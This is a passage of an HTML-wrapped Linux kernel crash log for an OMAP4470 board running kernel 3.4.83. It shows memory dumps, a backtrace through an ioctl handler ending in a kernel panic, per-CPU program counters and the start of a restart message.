&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c02ba53c 575b4b92</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.262176] be40: d8578000 00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.271392] be60: c2d6bf04 c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.280609] be80: c2d6bedc c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.289703] bea0: 575b4b92 4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.298919] bec0: 00000000 00000000 00000000 00000000 00000000 00000000 c02089fc 00000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.308105] bee0: dcae46c0 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.317352] bf00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.326416] bf20: dcf8c440 c2d6bf0c c2d6a000 00b8dd80 00b8dd90 40385d8d dcae46c0 0000000b</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.335662] bf40: c2d6a000 00000000 c2d6bf64 00000000 00b8dd90 40385d8d dcae46c0 0000000b</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.344879] bf60: c2d6a000 00000000 c2d6bfa4 c2d6bf78 c01365e0 c0135fc4 00000000 00000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.354095] bf80: c0013e08 00b8dd80 000121c0 00000000 00000036 c0013e08 00000000 c2d6bfa8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.363159] bfa0: c0013c60 c0136578 00b8dd80 000121c0 0000000b 40385d8d 00b8dd90 00b8dd90</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.372406] bfc0: 00b8dd80 000121c0 00000000 00000036 00000000 00000000 00000000 bee035f4</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.381622] bfe0: 810100fc bee030f4 00011578 0002b28c 60000010 0000000b 4d6969d9 03020430</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.390686] Backtrace: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.393829] [&lt;c031877c&gt;] (c2dm_l1cache+0x0/0x100) from [&lt;c031782c&gt;] (dev_ioctl+0x3f0/0x10c4)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.403228] [&lt;c031743c&gt;] (dev_ioctl+0x0/0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c/0x5b4)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.412658] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0/0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74/0x84)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.421874] [&lt;c013656c&gt;] (sys_ioctl+0x0/0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.431304] &nbsp;r8:c0013e08 r7:00000036 r6:00000000 r5:000121c0 r4:00b8dd80</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.439605] Code: e0814200 e1a06001 e1a03001 e3a02000 (e5930008) </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.450225] Board Information: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.450225] &nbsp;Revision : 0001</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.450256] &nbsp;Serial &nbsp;&nbsp;&nbsp;: 0000000000000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.450256] SoC Information:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.450256] &nbsp;CPU &nbsp;&nbsp;&nbsp;: OMAP4470</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.450286] &nbsp;Rev &nbsp;&nbsp;&nbsp;: ES1.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.450286] &nbsp;Type &nbsp;&nbsp;&nbsp;: HS</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.450286] &nbsp;Production ID: 0002B975-000000CC</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.450286] &nbsp;Die ID &nbsp;&nbsp;&nbsp;: 1CC60000-50002FFF-0B00935D-11007004</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.450317] </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.485900] ---[ end trace 0fe3b4c74b4e9fa7 ]---</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.491149] Kernel panic - not syncing: Fatal exception</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.496917] CPU1: stopping</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.500152] Backtrace: </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.503204] [&lt;c0018148&gt;] (dump_backtrace+0x0/0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18/0x1c)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.512695] &nbsp;r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.519714] [&lt;c0698ba0&gt;] (dump_stack+0x0/0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190/0x1c4)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.528961] [&lt;c0019a48&gt;] (handle_IPI+0x0/0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58/0x60)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.538482] [&lt;c00084a4&gt;] (gic_handle_irq+0x0/0x60) from [&lt;c06a5540&gt;] (__irq_usr+0x40/0x60)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.547637] Exception stack(0xd85a5fb0 to 0xd85a5ff8)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.553466] 5fa0: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;41822290 418185e8 00000001 41c95000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.562561] 5fc0: 418185e8 41687460 4010d0ec 418185e8 4010d038 41689398 7fffffff 401602ec</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.571777] 5fe0: 418191e8 5ba34d10 41609aa8 41609974 200b0010 ffffffff</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.579284] &nbsp;r6:ffffffff r5:200b0010 r4:41609974 r3:41822290</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.586364] CPU0 PC (0) : 0xc003ee38</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.590576] CPU0 PC (1) : 0xc003ee54</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.594635] CPU0 PC (2) : 0xc003ee54</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.598693] CPU0 PC (3) : 0xc003ee54</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.602722] CPU0 PC (4) : 0xc003ee54</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.606781] CPU0 PC (5) : 0xc003ee54</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.610839] CPU0 PC (6) : 0xc003ee54</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.614898] CPU0 PC (7) : 0xc003ee54</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.619110] CPU0 PC (8) : 0xc003ee54</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.623168] CPU0 PC (9) : 0xc003ee54</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.627227] CPU1 PC (0) : 0xc0019b2c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.631408] CPU1 PC (1) : 0xc0019b2c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.635467] CPU1 PC (2) : 0xc0019b2c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.639495] CPU1 PC (3) : 0xc0019b2c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.643707] CPU1 PC (4) : 0xc0019b2c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.647766] CPU1 PC (5) : 0xc0019b2c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.651824] CPU1 PC (6) : 0xc0019b2c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.656005] CPU1 PC (7) : 0xc0019b2c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.660064] CPU1 PC (8) : 0xc0019b2c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.664123] CPU1 PC (9) : 0xc0019b2c</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.668182] </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.669952] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ &nbsp;145.669982</span></p></body>
</html>
